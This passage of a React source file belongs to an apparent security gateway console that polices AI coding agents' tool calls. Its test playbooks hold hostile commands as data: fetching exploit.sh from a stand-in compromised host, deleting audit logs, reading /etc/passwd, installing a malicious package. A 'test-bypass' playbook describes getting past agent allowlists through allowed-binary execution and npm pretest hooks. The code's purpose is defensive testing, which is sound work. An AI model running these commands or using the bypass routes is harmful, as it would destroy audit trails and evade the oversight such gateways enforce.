        alert(`Failed to approve extension: ${err.error || err.message || 'Unknown error'}`);
      }
    } catch (e: any) {
      alert(`Error approving extension: ${e.message}`);
    }
  };

  // Reject Budget Extension Request
  const handleRejectBudgetExtension = async (id: string) => {
    try {
      const res = await fetch(`${API_BASE}/ibp/budget/reject-extension`, {
        method: 'POST',
        headers: getHeaders(),
        body: JSON.stringify({ id })
      });
      if (res.ok) {
        fetchData();
        setConsoleLines(prev => [
          ...prev,
          `❌ [IBP] Budget Extension Rejected for ID: ${id}`
        ]);
      } else {
        const err = await res.json();
        alert(`Failed to reject extension: ${err.error || err.message || 'Unknown error'}`);
      }
    } catch (e: any) {
      alert(`Error rejecting extension: ${e.message}`);
    }
  };

  // Verify the exact input via the gateway; edited inputs invalidate in-flight results.
  const handleVerifyReceipt = async () => {
    const version = ++verificationVersion.current;
    let receipt: unknown;
    try {
      receipt = JSON.parse(receiptInput);
    } catch {
      setVerificationResult({ status: 'error', message: 'Invalid JSON. Paste a complete signed receipt.' });
      return;
    }
    setVerificationBusy(true);
    setVerificationResult({ status: 'idle', message: '' });
    try {
      const res = await fetch(`${API_BASE}/receipts/verify`, {
        method: 'POST', headers: getHeaders(), body: JSON.stringify(receipt), signal: AbortSignal.timeout(10000)
      });
      const data = await res.json();
      if (version !== verificationVersion.current) return;
      if (!res.ok) {
        setVerificationResult({ status: res.status === 400 ? 'invalid' : 'error', message: data.error || `Gateway returned HTTP ${res.status}.` });
      } else {
        setVerificationResult({
          status: data.verified === true ? 'valid' : 'invalid',
          message: data.verified === true ? 'The gateway accepted this receipt under its configured signature verification rules.' : data.reason || 'The gateway did not accept this signature. Check the receipt and signing key.',
          payload: receipt && typeof receipt === 'object' && 'payload' in receipt ? receipt.payload : undefined
        });
      }
    } catch {
      if (version === verificationVersion.current) setVerificationResult({ status: 'error', message: 'The gateway could not complete verification. Check its connection and try again.' });
    } finally {
      if (version === verificationVersion.current) setVerificationBusy(false);
    }
  };

  // Clear database helper
  const handleResetDatabase = async () => {
    if (authRole !== 'admin') return;
    if (!confirm('Are you sure you want to reset all transactions, receipts, and findings to the original template status?')) return;
    try {
      const res = await fetch(`${API_BASE}/reset`, { 
        method: 'POST',
        headers: getHeaders()
      });
      
      if (res.ok) {
        fetchData();
        setConsoleLines(prev => [
          ...prev,
          '⚠️  [DATABASE] Security Gateway database reset to initial seed data.'
        ]);
      } else {
        const err = await res.json();
        alert(`Error: ${err.error}`);
      }
    } catch (e) {
      console.error(e);
    }
  };

  // Live Unprivileged Sandbox Command Execution API Caller
  const executeSandboxCommand = async (fullCmd: string) => {
    setLatestAutofix(null);
    setConsoleLines(prev => [
      ...prev,
      `🛡️ [SANDBOX] Spawning unprivileged Docker container sandbox (gVisor optional)...`
    ]);
    
    try {
      const res = await fetch(`${API_BASE}/sandbox/execute`, {
        method: 'POST',
        headers: getHeaders(),
        body: JSON.stringify({ command: fullCmd })
      });
      
      if (res.status === 429) {
        const data = await res.json();
        setConsoleLines(prev => [
          ...prev,
          `⚠️  [AUTO-THROTTLE ACTIVE]: ${data.message || 'Tool execution throttled to protect system resources.'}`
        ]);
        return;
      }

      const data = await res.json();
      if (data.syscalls) {
        setSyscalls(data.syscalls);
      }
      if (res.ok) {
        if (data.status === 'pending_consensus') {
          setConsoleLines(prev => [
            ...prev,
            `⏳ [CONSENSUS GATING]: ${data.message}`,
            `👉 Instruction: Under the Compliance tab, collect all required signatures. Once approved, re-run this command to execute!`
          ]);
          return;
        }

        const logLines = (data.logs || '').split('\n');
        setConsoleLines(prev => [
          ...prev,
          ...logLines,
          `✅ [SANDBOX] Command completed successfully with exit code: 0.`
        ]);
      } else {
        const logLines = (data.logs || data.error || 'Execution failed').split('\n');
        setConsoleLines(prev => [
          ...prev,
          ...logLines,
          `❌ [SANDBOX] Sandboxed command execution failed.`
        ]);
        if (data.remediationSuggestion) {
          setConsoleLines(prev => [
            ...prev,
            `👉 Remediation Suggestion: ${data.remediationSuggestion}`
          ]);
        }
        if (data.suggestedAutofix) {
          setLatestAutofix(data.suggestedAutofix);
          setConsoleLines(prev => [
            ...prev,
            `💡 FidusGate detected a safe auto-fix. Apply it below: "${data.suggestedAutofix.replacement}"`
          ]);
        }
      }
    } catch (err: any) {
      setConsoleLines(prev => [
        ...prev,
        `❌ [SANDBOX] Network error connecting to execution API: ${err.message}`
      ]);
    }
  };

  // Unified playbook and manual command execution engine
  const executePlaybook = async (fullCmd: string) => {
    setLatestAutofix(null);
    const cmd = fullCmd.toLowerCase().trim();
    setActivePlaybook(cmd);
    const epoch = sessionEpoch.current;
    const pause = async () => {
      await new Promise<void>(resolve => setTimeout(resolve, 600));
      return epoch === sessionEpoch.current;
    };

    try {
      if (cmd === 'help') {
        setConsoleLines(prev => [
          ...prev,
          '=============================================================',
          '🛡️  FIDUSGATE SECURITY INTERACTIVE PLAYBOOK MENU',
          '=============================================================',
          'Type or click any of these simple playbooks to trigger live shields:',
          '  test-pii     - Test automatic PII filtering & transaction flagging',
          '  test-sandbox - Test command injection & binary execution blockers',
          '  test-bypass  - Test advanced allowed-binary egress & composition bypasses',
          '  test-receipt - Test cryptographic Ed25519 signature & tamper proofing',
          '  test-scanner - Test real-time GitHub Actions static threat scans',
          '  test-cedar   - Test active dynamic Cedar AST access-control rules',
          '  test-alerts  - Test real-time webhook incident alerting gateways',
          '',
          'Utility commands:',
          '  help         - Show this playbook menu',
          '  sys-status   - Show observed gateway and session status',
          '  clear        - Clear the terminal console screen',
          '============================================================='
        ]);
      } else if (cmd === 'clear') {
        setConsoleLines([]);
      } else if (cmd === 'sys-status') {
        setConsoleLines(prev => [
          ...prev,
          `[SYSTEM] Last gateway health status: ${connection}`,
          '[SANDBOX] Docker/gVisor availability has not been checked by this console.',
          `[GATEWAY] ${gatewayNotice || 'Inspect Governance for reported controls.'}`,
          `🧑‍💻 Session Role: ${authRole.toUpperCase()}`,
          `🎫 Authorized JWT: ${authToken ? 'ACTIVE (development bearer)' : 'NONE (Guest Mode)'}`
        ]);
      } else if (cmd === 'test-pii') {
        if (authRole !== 'admin' && authRole !== 'developer') {
          setConsoleLines(prev => [
            ...prev,
            `❌ SECURITY ERROR: Authenticated session required to submit transactions!`,
            `👉 Recommendation: Please log in using the gateway session panel at the top.`
          ]);
          setActivePlaybook(null);
          return;
        }
        setConsoleLines(prev => [
          ...prev,
          '🚀 [PLAYBOOK] Starting PII auto-masking & transaction anomaly audit...',
          '📡 [API] Dispatched payload: { sender: "hacker-wallet@tor.network", amount: 1500000, recipient: "Primary Vault" }'
        ]);
        if (epoch !== sessionEpoch.current) return;
        const res = await fetch(`${API_BASE}/transactions`, {
          method: 'POST',
          headers: getHeaders(),
          body: JSON.stringify({
            sender: 'hacker-wallet@tor.network',
            recipient: 'Primary Vault',
            amount: 1500000,
            currency: 'USD'
          })
        });
        if (res.ok) {
          const tx = await res.json();
          setTransactions(prev => [tx, ...prev]);
          setConsoleLines(prev => [
            ...prev,
            `🛡️  [PII FILTERED] Intercepted sender email! Masked to: "${tx.sender}"`,
            `⚠️  [SUSPICIOUS FLAGGED] Tor node & amount > $1,000,000 caught! Status marked: "flagged"`,
            `✅ [PLAYBOOK] Ledger successfully updated. Check the stream table!`
          ]);
        } else {
          const err = await res.json();
          setConsoleLines(prev => [...prev, `❌ [SECURITY ERROR] API rejected request: ${err.error}`]);
        }
      } else if (cmd === 'test-sandbox') {
        setConsoleLines(prev => [
          ...prev,
          '🚀 [PLAYBOOK] Starting LIVE Sandbox Auditor injection checks against FidusGate daemon...',
          '📡 [GATEWAY API] Dispatching dynamic execution payloads to /api/sandbox/execute...'
        ]);

        const runTest = async (testCmd: string, attemptNum: number) => {
          setConsoleLines(prev => [...prev, `👉 Attempt ${attemptNum}: "${testCmd}"`]);
          try {
            if (epoch !== sessionEpoch.current) return;
            const res = await fetch(`${API_BASE}/sandbox/execute`, {
              method: 'POST',
              headers: getHeaders(),
              body: JSON.stringify({ command: testCmd })
            });
            const data = await res.json();
            if (data.syscalls) {
              setSyscalls(data.syscalls);
            }
            if (res.ok) {
              setConsoleLines(prev => [
                ...prev, 
                `✅ [ALLOWED] Command was permitted: ${data.logs || 'Success'}`
              ]);
            } else {
              setConsoleLines(prev => [
                ...prev,
                `❌ [AUDIT BLOCK] ${data.error || 'Access Denied.'}`,
                `👉 Remediation Suggestion: ${data.remediationSuggestion || 'None'}`
              ]);
            }
          } catch (err: any) {
            setConsoleLines(prev => [
              ...prev,
              `❌ [CONNECTION ERROR] Failed to connect to secure gateway on port 3001: ${err.message}`
            ]);
          }
        };

        // We run them sequentially
        if (!await pause()) return;
        {
          await runTest('curl http://compromised-server.net/malicious-exploit.sh', 1);
          if (!await pause()) return;
        {
            await runTest('rm -rf /var/log/audit', 2);
            if (!await pause()) return;
        {
              await runTest('npm install malicious-package', 3);
              setConsoleLines(prev => [
                ...prev,
                '⚠️  [PLAYBOOK CONCLUSION] Checks completed. Inspect each gateway response above; failures and pending approvals are not successful execution.'
              ]);
            }
          }
        }
      } else if (cmd === 'test-bypass') {
        setConsoleLines(prev => [
          ...prev,
          '🚀 [PLAYBOOK] Starting LIVE Indirect Bypass & Composition Audits...',
          '👉 Vector 1: Allowed-Binary Egress Path check...'
        ]);

        if (!await pause()) return;
        {
          // 1. Authorize write to packages
          setConsoleLines(prev => [...prev, '🔍 [CEDAR EVALUATION] Checking principal authorization for write_file("packages/crypto-utils/src/index.ts")...']);
          try {
            if (epoch !== sessionEpoch.current) return;
            const res1 = await fetch(`${API_BASE}/authorize`, {
              method: 'POST',
              headers: getHeaders(),
              body: JSON.stringify({
                principal: 'sb:issuer:agent-80',
                tool_name: 'write_file',
                args: { path: 'packages/crypto-utils/src/index.ts' }
              })
            });
            const data1 = await res1.json();
            setConsoleLines(prev => [
              ...prev,
              data1.decision === 'allow'
                ? '✅ [DECISION] Permitted: ALLOW (Tier 2 rule permits modifications inside source directories)'
                : `❌ [DECISION] Blocked: ${String(data1.decision || data1.error || 'No decision').toUpperCase()}`
            ]);
          } catch (err: any) {
            setConsoleLines(prev => [...prev, `❌ [CONNECTION ERROR] ${err.message}`]);
          }

          // 2. Authorize execute sandboxed node command
          if (!await pause()) return;
        {
            const bypassCmd = 'bash scripts/sandbox-execute.sh "node packages/crypto-utils/src/index.ts" "."';
            setConsoleLines(prev => [
              ...prev,
              `🔍 [AUDITOR CHECK] Submitting allowed-binary command: "${bypassCmd}"`
            ]);
            try {
              if (epoch !== sessionEpoch.current) return;
              const res2 = await fetch(`${API_BASE}/sandbox/execute`, {
                method: 'POST',
                headers: getHeaders(),
                body: JSON.stringify({ command: bypassCmd })
              });
              const data2 = await res2.json();
              if (data2.syscalls) {
                setSyscalls(data2.syscalls);
              }
              
              setConsoleLines(prev => [
                ...prev,
                res2.ok 
                  ? `✅ [GATEWAY DECISION] Permitted: ALLOW. (Command completed successfully!)\n${data2.logs || ''}`
                  : `❌ [GATEWAY DECISION] Blocked: ${data2.error || 'Access Denied.'}`
              ]);
            } catch (err: any) {
              setConsoleLines(prev => [...prev, `❌ [CONNECTION ERROR] ${err.message}`]);
            }

            // 3. Vector 2: Composition check
            if (!await pause()) return;
        {
              setConsoleLines(prev => [
                ...prev,
                '👉 Vector 2: Cross-Tier Composition Path check...',
                '🔍 [CEDAR EVALUATION] Checking principal authorization for write_file("apps/secure-gateway/package.json")...'
              ]);
              try {
                if (epoch !== sessionEpoch.current) return;
                const res3 = await fetch(`${API_BASE}/authorize`, {
                  method: 'POST',
                  headers: getHeaders(),
                  body: JSON.stringify({
                    principal: 'sb:issuer:agent-80',
                    tool_name: 'write_file',
                    args: { path: 'apps/secure-gateway/package.json' }
                  })
                });
                const data3 = await res3.json();
                setConsoleLines(prev => [
                  ...prev,
                  data3.decision === 'allow'
                    ? '✅ [DECISION] Permitted: ALLOW (Tier 2 rule permits package.json workspace edits)'
                    : `❌ [DECISION] Blocked: ${String(data3.decision || data3.error || 'No decision').toUpperCase()}`,
                  '📦 [COMPOSITION ATTACK] Pretest hook executes implicitly during allowed npm test runs.',
                  '⚠️  [CONCLUSION] Obvious commands are audited, but allowlist gates cannot block composition hooks or allowed-binary capabilities on the host!'
                ]);
              } catch (err: any) {
                setConsoleLines(prev => [...prev, `❌ [CONNECTION ERROR] ${err.message}`]);
              }
            }
          }
        }
      } else if (cmd === 'test-receipt') {
        if (authRole !== 'admin') {
          setConsoleLines(prev => [
            ...prev,
            `❌ SECURITY ERROR: Administrative credentials required to spawn isolated shell runtimes!`,
            `👉 Recommendation: Please authenticate as 'Administrator' using the gateway session panel.`
          ]);
          setActivePlaybook(null);
          return;
        }
        setConsoleLines(prev => [
          ...prev,
          '🚀 [PLAYBOOK] Booting cryptographic demonstrator inside Docker sandbox...',
          '🔒 [CRYPTO] Generating key pair, signing mock receipts, and testing tamper detection...'
        ]);
        await executeSandboxCommand('node scripts/demonstrate_tampering.js');
      } else if (cmd === 'test-scanner') {
        if (authRole !== 'admin') {
          setConsoleLines(prev => [
            ...prev,
            `❌ SECURITY ERROR: Administrative credentials required to spawn isolated shell runtimes!`,
            `👉 Recommendation: Please authenticate as 'Administrator' using the gateway session panel.`
          ]);
          setActivePlaybook(null);
          return;
        }
        setConsoleLines(prev => [
          ...prev,
          '🚀 [PLAYBOOK] Spawning AST workflow scanner inside read-only sandbox container...',
          '🔍 [SCANNER] Parsing `.github/workflows/ci-agent-pipeline.yml` for prompt-injection hazards...'
        ]);
        await executeSandboxCommand('node scripts/workflow-scanner.js');
      } else if (cmd === 'test-cedar') {
        if (authRole !== 'admin' && authRole !== 'developer') {
          setConsoleLines(prev => [
            ...prev,
            `❌ SECURITY ERROR: Authenticated session required to run Cedar policy queries!`,
            `👉 Recommendation: Please log in using the gateway session panel at the top.`
          ]);
          setActivePlaybook(null);
          return;
        }
        setConsoleLines(prev => [
          ...prev,
          '🚀 [PLAYBOOK] Initializing Cedar Dynamic Policy authorization audit...',
          '🔒 [POLICY] Querying active rules in "policy.cedar" against simulated AI Agent tool calls...'
        ]);

        // Run query 1: write_file to policy.cedar
        try {
          if (epoch !== sessionEpoch.current) return;
          const res1 = await fetch(`${API_BASE}/authorize`, {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({
              principal: 'sb:issuer:agent-80',
              tool_name: 'write_file',
              args: { path: 'policy.cedar' }
            })
          });
          const data1 = await res1.json();
          setConsoleLines(prev => [
            ...prev,
            `👉 Simulation A: write_file("policy.cedar")`,
            `🔍 [CEDAR EVALUATION] Principal: "sb:issuer:agent-80" | Action: "call_tool" | Resource: "policy.cedar"`,
            data1.decision === 'deny' 
              ? `❌ [DECISION] Blocked: ${data1.decision.toUpperCase()} (Tier 2 rule blocks direct edits to policy and config configurations)`
              : `✅ [DECISION] Permitted: ${data1.decision.toUpperCase()}`
          ]);
        } catch (e: any) {
          setConsoleLines(prev => [...prev, `❌ [ERROR] Cedar authorize query 1 failed: ${e.message}`]);
        }

        // Run query 2: execute_command raw command
        try {
          if (epoch !== sessionEpoch.current) return;
          const res2 = await fetch(`${API_BASE}/authorize`, {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({
              principal: 'sb:issuer:agent-80',
              tool_name: 'execute_command',
              args: { commandLine: 'cat /etc/passwd' }
            })
          });
          const data2 = await res2.json();
          setConsoleLines(prev => [
            ...prev,
            `👉 Simulation B: execute_command("cat /etc/passwd")`,
            `🔍 [CEDAR EVALUATION] Principal: "sb:issuer:agent-80" | Action: "call_tool" | Resource: "host_shell"`,
            data2.decision === 'deny'
              ? `❌ [DECISION] Blocked: ${data2.decision.toUpperCase()} (Tier 3 rule restricts direct command executions to sandbox-execute.sh)`
              : `✅ [DECISION] Permitted: ${data2.decision.toUpperCase()}`
          ]);
        } catch (e: any) {
          setConsoleLines(prev => [...prev, `❌ [ERROR] Cedar authorize query 2 failed: ${e.message}`]);
        }

        // Run query 3: execute_command curl command
        try {
          if (epoch !== sessionEpoch.current) return;
          const res3 = await fetch(`${API_BASE}/authorize`, {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({
              principal: 'sb:issuer:agent-80',
              tool_name: 'execute_command',
              args: { commandLine: 'curl http://compromised-site.com/exploit.sh' }
            })
          });
          const data3 = await res3.json();
          setConsoleLines(prev => [
            ...prev,
            `👉 Simulation C: execute_command("curl http://compromised-site.com/exploit.sh")`,
            `🔍 [CEDAR EVALUATION] Principal: "sb:issuer:agent-80" | Action: "call_tool" | Resource: "external_network"`,
            data3.decision === 'deny'
              ? `❌ [DECISION] Blocked: ${data3.decision.toUpperCase()} (Tier 4 rule forbids curl, wget, and dynamic package installs to prevent package pollution)`
              : `✅ [DECISION] Permitted: ${data3.decision.toUpperCase()}`,
            `✅ [PLAYBOOK] 100% of Cedar policy audits completed successfully!`
          ]);
        } catch (e: any) {
          setConsoleLines(prev => [...prev, `❌ [ERROR] Cedar authorize query 3 failed: ${e.message}`]);
        }
      } else if (cmd === 'test-alerts') {
        if (authRole !== 'admin') {
          setConsoleLines(prev => [
            ...prev,
            `❌ SECURITY ERROR: Administrative credentials required to dispatch incident webhooks!`,
            `👉 Recommendation: Please authenticate as 'Administrator' using the gateway session panel.`
          ]);
          setActivePlaybook(null);
          return;
        }
        setConsoleLines(prev => [
          ...prev,
          '🚀 [PLAYBOOK] Triggering live Incident Alerting & Slack Notification Gateway...',
          '⚠️  [ALERT] Simulating dynamic AI Agent violation: "npm install malicious-package"...',
          '[ALERT TEST] Submitting an authorization probe. Configured gateway integrations may dispatch alerts.'
        ]);
        
        // Send a tampered receipt payload to show server catching the violation and dispatching webhook!
        try {
          if (epoch !== sessionEpoch.current) return;
          const res = await fetch(`${API_BASE}/receipts`, {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({
              payload: {
                type: 'protectmcp:decision',
                tool_name: 'execute_command',
                decision: 'allow',
                policy_digest: 'sha256:8f413a9de010',
                issued_at: new Date().toISOString(),
                issuer_id: 'sb:issuer:de073ae64e43',
                reason: 'Altered reason to bypass',
                claimed_issuer_tier: 4,
                args: { commandLine: 'npm install malicious-package' }
              },
              signature: {
                alg: 'EdDSA',
                kid: 'sb:issuer:de073ae64e43',
                sig: '4b69107824576da51c8a389e2f5012e3c60ef40ffd62f18c2b98327eb921be783e5a0d660d661982d58147022dbd93fa073bd45d6ae0121fa15f0497eb1a8209'
              }
            })
          });
          
          if (!res.ok) {
            const err = await res.json();
            setConsoleLines(prev => [
              ...prev,
              `🔒 [SERVER GATE] Caught tampered audit trail!`,
              `❌ [SECURITY ALERT] ${err.error}`,
              `⚙️  [WEBHOOK] Slack Gateway dispatched rich visual security block:`
            ]);
            
            // Print the exact beautiful Slack Webhook JSON block formatting!
            setConsoleLines(prev => [
              ...prev,
              '=============================================================',
              '🟢 EXAMPLE ALERT PAYLOAD (DELIVERY NOT VERIFIED):',
              '=============================================================',
              JSON.stringify({
                text: "🚨 FidusGate Security Alert: Blocked AI Agent Action!",
                blocks: [
                  {
                    type: "section",
                    text: {
                      type: "mrkdwn",
                      text: "🚨 *FidusGate Security Alert: Blocked AI Agent Action!*\nAn autonomous coding agent attempted to execute a high-risk tool call that was programmatically blocked by Cedar policy controls."
                    }
                  },
                  {
                    type: "divider"
                  },
                  {
                    type: "section",
                    fields: [
                      { type: "mrkdwn", text: "*🔧 Tool Attempted:*\n`execute_command`" },
                      { type: "mrkdwn", text: "*🛡️ Decision:*\n`DENY`" },
                      { type: "mrkdwn", text: "*🎖️ Risk Tier:*\n`Tier 4 (Critical)`" },
                      { type: "mrkdwn", text: "*✍️ Signed Issuer:*\n`sb:issuer:de073ae64e43`" }
                    ]
                  },
                  {
                    type: "section",
                    text: {
                      type: "mrkdwn",
                      text: "*📋 Audit Reason:* Tier 4 rule forbids curl, wget, and dynamic package installs to prevent package pollution."
                    }
                  }
                ]
              }, null, 2),
              '=============================================================',
              '[PLAYBOOK] Denied request recorded. External alert delivery has not been verified.'
            ]);
          }
        } catch (e: any) {
          setConsoleLines(prev => [...prev, `❌ [ERROR] Failed to query receipts verification API: ${e.message}`]);
        }
      } else if (
        cmd.startsWith('npm run build') || 
        cmd.startsWith('npm run test') || 
        cmd.startsWith('bash scripts/bootstrap.sh') ||
        cmd.startsWith('bash scripts/ham-drift-watcher.sh') ||
        cmd.startsWith('node packages/crypto-utils') ||
        cmd.startsWith('node scripts/workflow-scanner.js') ||
        cmd.startsWith('rm') ||
        cmd.startsWith('curl') ||
        cmd.startsWith('npm install')
      ) {
        if (authRole !== 'admin' && authRole !== 'developer') {
          setConsoleLines(prev => [
            ...prev,
            `❌ SECURITY ERROR: Administrative or Developer credentials required to spawn isolated shell runtimes!`,
            `👉 Recommendation: Please authenticate using the gateway session panel.`
          ]);
          setActivePlaybook(null);
          return;
        }
        await executeSandboxCommand(fullCmd);
      } else {
        setConsoleLines(prev => [
          ...prev,
          `❌ Command not permitted in sandbox: "${fullCmd}". Type "help" to view allowed workspace playbooks.`
        ]);
      }
    } catch (err: any) {
      setConsoleLines(prev => [
        ...prev,
        `❌ [ERROR] Playbook execution failed: ${err.message}`
      ]);
    } finally {
      setActivePlaybook(null);
    }
  };

  // Live Console Submit Handler
  const handleConsoleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!consoleInput.trim() || activePlaybook) return;

    const fullCmd = consoleInput.trim();
    setConsoleLines(prev => [...prev, `fidusgate-sandbox $ ${fullCmd}`]);
    setConsoleInput('');
    await executePlaybook(fullCmd);
  };

  // Playbook Button Trigger Handler
  const handlePlaybookClick = async (cmd: string) => {
    if (activePlaybook) return; // Prevent concurrent run jams
    setConsoleLines(prev => [...prev, `fidusgate-sandbox $ ${cmd}`]);
    await executePlaybook(cmd);
  };

  return (
    <ConnectedShell view={activeTab} onNavigate={setActiveTab} connection={connection}
      authRole={authRole} authEmail={authEmail} gatewayNotice={gatewayNotice}
      onRefresh={() => void fetchData()} onTour={() => { setTourStep(0); setTourActive(true); }}
      onReset={handleResetDatabase}
      session={<div id="oidc-widget">
        <div className="oidc-title"><h3>Development gateway session</h3>
          <p>Use the gateway’s bootstrap key to request a role-scoped session. Credentials stay in memory. Production sign-in is not implemented.</p></div>
        {authRole === 'unauthenticated' ? <div className="oidc-controls">
          <label>Email<input type="email" className="form-control" value={authEmail} onChange={e => setAuthEmail(e.target.value)} autoComplete="username" /></label>
          <label>Bootstrap key<input type="password" className="form-control" value={bootstrapKey} onChange={e => setBootstrapKey(e.target.value)} autoComplete="off" /></label>
          {(['developer', 'admin', 'auditor'] as const).map(role => <button key={role} className="btn btn-secondary" onClick={() => void handleOidcLogin(role)} disabled={authLoading || !bootstrapKey.trim()}>Sign in as {role}</button>)}
        </div> : <div className="oidc-controls"><p>Signed in as <strong>{authEmail}</strong> · {authRole}. Authenticated data refreshes every four seconds.</p><button className="btn btn-secondary" onClick={handleOidcLogout}>Disconnect session</button></div>}
        {authError && <p role="alert">{authError}</p>}
      </div>}>
      {/* Tab Panels */}
      <div className="tab-content-panel">
        {activeTab === 'decisions' && <ConnectedDecisions receipts={receipts} status={receiptStatus} isChainValid={isChainValid} onRetry={() => void fetchData()} onVerify={receipt => { updateReceiptInput(JSON.stringify(receipt, null, 2)); setActiveTab('verify'); }} />}
        {activeTab === 'verify' && <ConnectedVerifier input={receiptInput} onInputChange={updateReceiptInput} onVerify={handleVerifyReceipt} result={verificationResult} busy={verificationBusy} />}
        {activeTab === 'ledger' && (
          <fieldset disabled={authRole !== 'admin' && authRole !== 'developer'} style={{ border: 0, padding: 0, margin: 0, minWidth: 0 }}><legend className="cc-description">Transactions · creating requests requires an admin or developer session.</legend><LedgerTab
            transactions={transactions}
            txNotification={txNotification}
            txError={txFormState.error}
            txSender={txSender}
            setTxSender={setTxSender}
            txRecipient={txRecipient}
            setTxRecipient={setTxRecipient}
            txAmount={txAmount}
            setTxAmount={setTxAmount}
            txCurrency={txCurrency}
            setTxCurrency={setTxCurrency}
            txLoading={txLoading}
            formAction={txFormAction}
          /></fieldset>
        )}
        {activeTab === 'compliance' && (
          <ComplianceTab
            authRole={authRole}
            authEmail={authEmail}
            attestedClaims={attestedClaims}
            ibpState={ibpState}
            driftState={driftState}
            driftSyncLoading={driftSyncLoading}
            systemConfig={systemConfig}
            systemConfigLoading={systemConfigLoading}
            prometheusMetrics={prometheusMetrics}
            findings={findings}
            plmState={plmState}
            pendingPatch={pendingPatch}
            patchApplyLoading={patchApplyLoading}
            consensusRequests={consensusRequests}
            consensusLoading={consensusLoading}
            budgetExtensions={budgetExtensions}
            budgetExtensionAmount={budgetExtensionAmount}
            setBudgetExtensionAmount={setBudgetExtensionAmount}
            budgetExtensionReason={budgetExtensionReason}
            setBudgetExtensionReason={setBudgetExtensionReason}
            budgetExtensionLoading={budgetExtensionLoading}
            feedbackRole={feedbackRole}
            setFeedbackRole={setFeedbackRole}
            feedbackComment={feedbackComment}
            setFeedbackComment={setFeedbackComment}
            feedbackSeverity={feedbackSeverity}
            setFeedbackSeverity={setFeedbackSeverity}
            feedbackLoading={feedbackLoading}
            alignJustification={alignJustification}
            setAlignJustification={setAlignJustification}
            alignLoading={alignLoading}
            handleExportAuditReport={handleExportAuditReport}
            handleToggleCircuitBreaker={handleToggleCircuitBreaker}
            handleDriftSync={handleDriftSync}
            handleApplyPatch={handleApplyPatch}
            handleApproveConsensus={handleApproveConsensus}
            handleOverrideConsensus={handleOverrideConsensus}
            handleApproveBudgetExtension={handleApproveBudgetExtension}
            handleRejectBudgetExtension={handleRejectBudgetExtension}
            handleCreateBudgetExtensionRequest={handleCreateBudgetExtensionRequest}
            handleLogFeedback={handleLogFeedback}
            handleAlignFeedback={handleAlignFeedback}
          />
        )}
        {activeTab === 'policy' && (
          <PolicyTab
            authRole={authRole}
            chatMessages={chatMessages}
            chatInput={chatInput}
            setChatInput={setChatInput}
            chatLoading={chatLoading}
            setChatLoading={setChatLoading}
            setChatMessages={setChatMessages}
            chatApplyLoading={chatApplyLoading}
            setChatApplyLoading={setChatApplyLoading}
            chatEndRef={chatEndRef}
            simOverrideMode={simOverrideMode}
            setSimOverrideMode={setSimOverrideMode}
            simDraftPolicy={simDraftPolicy}
            setSimDraftPolicy={setSimDraftPolicy}
            simPrincipal={simPrincipal}
            setSimPrincipal={setSimPrincipal}
            simToolName={simToolName}
            setSimToolName={setSimToolName}
            simArgs={simArgs}
            setSimArgs={setSimArgs}
            simContext={simContext}
            setSimContext={setSimContext}
            simLoading={simLoading}
            simResult={simResult}
            activePolicyCode={activePolicyCode}
            consoleLines={consoleLines}
            setConsoleLines={setConsoleLines}
            handleSimulate={handleSimulate}
            fetchData={fetchData}
            getHeaders={getHeaders}
          />
        )}
        {activeTab === 'forensics' && (
          <ForensicsTab
            forensicLogs={forensicLogs}
            receipts={receipts}
            isChainValid={isChainValid}
            forensicSearch={forensicSearch}
            setForensicSearch={setForensicSearch}
            forensicStatusFilter={forensicStatusFilter}
            setForensicStatusFilter={setForensicStatusFilter}
            authRole={authRole}
            receiptInput={receiptInput}
            setReceiptInput={updateReceiptInput}
            verificationResult={verificationResult}
            handleVerifyReceipt={handleVerifyReceipt}
            handleDownloadComplianceReceipt={handleDownloadComplianceReceipt}
          />
        )}
        {activeTab === 'sandbox' && (
          <SandboxTab
            authRole={authRole}
            activePlaybook={activePlaybook}
            handlePlaybookClick={handlePlaybookClick}
            consoleLines={consoleLines}
            consoleInput={consoleInput}
            setConsoleInput={setConsoleInput}
            consoleEndRef={consoleEndRef}
            handleConsoleSubmit={handleConsoleSubmit}
            showArchPanel={showArchPanel}
            setShowArchPanel={setShowArchPanel}
            selectedArchComp={selectedArchComp}
            setSelectedArchComp={setSelectedArchComp}
            syscalls={syscalls}
            latestAutofix={latestAutofix}
            setLatestAutofix={setLatestAutofix}
            executeSandboxCommand={executeSandboxCommand}
          />
        )}
      </div>

      {/* Guided Onboarding Tour Overlay Tooltips */}
      {tourActive && (
        <>
          <div className="tour-backdrop" onClick={() => setTourActive(false)} />
          <div 
            className="tour-tooltip" 
            style={getTourTooltipStyle(tourStep)}
          >
            <div className="tour-header">
              <span className="tour-step-badge">Step {tourStep + 1} of {tourSteps.length}</span>
              <button className="tour-close-btn" onClick={() => setTourActive(false)}>✕</button>
            </div>
            <h4 className="tour-title">{tourSteps[tourStep].title}</h4>
            <p className="tour-body">{tourSteps[tourStep].body}</p>
            <div className="tour-footer">
              <button className="tour-skip-btn" onClick={() => setTourActive(false)}>Skip Tour</button>
              <div className="tour-nav-btns">
                {tourStep > 0 && (
                  <button className="tour-btn tour-btn-prev" onClick={handleTourPrev}>Back</button>
                )}
                <button 
                  className="tour-btn tour-btn-next" 
                  onClick={handleTourNext}
                >
                  {tourStep === tourSteps.length - 1 ? 'Finish' : 'Next'}
                </button>
              </div>
            </div>
          </div>
        </>
      )}
    </ConnectedShell>
  );
}
